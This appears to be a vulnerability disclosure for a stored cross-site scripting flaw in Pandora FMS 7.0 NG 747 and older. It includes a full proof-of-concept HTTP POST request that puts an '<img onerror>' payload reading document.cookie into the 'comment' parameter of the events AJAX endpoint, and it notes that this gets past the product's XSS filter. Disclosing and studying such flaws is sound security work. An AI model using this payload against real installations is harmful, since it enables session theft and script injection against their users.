# Pandora-FMS-7.0-NG-747-Stored-XSS
A stored cross-site scripting (XSS) in Pandora FMS 7.0 NG 747 can result in an attacker performing malicious actions to users who open a maliciously crafted link or third-party web page. In addition, the existing XSS filter can be bypassed with the "<img" tag.

Pandora FMS 7.0 NG747 and older versions are affected by this vulnerability.


# PoC
To exploit vulnerability, someone could use a POST request to '/pandora_console/ajax.php' by manipulating 'comment' parameter in the request body to impact users who open a maliciously crafted link or third-party web page.

```
POST /pandora_console/ajax.php HTTP/1.1
Host: [HOST]
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 119
DNT: 1
Connection: close
Cookie: PHPSESSID=a55pr5b4gff5ea1h0pms4csrk5

page=include/ajax/events&add_comment=1&event_id=7&comment=<img src=x onerror="alert(document.cookie)">&meta=0&history=0
```

![](https://emreovunc.com/blog/en/Pandora-FMS-7.0-NG-747-Stored-XSS-01.png)

![](https://emreovunc.com/blog/en/Pandora-FMS-7.0-NG-747-Stored-XSS-02.png)
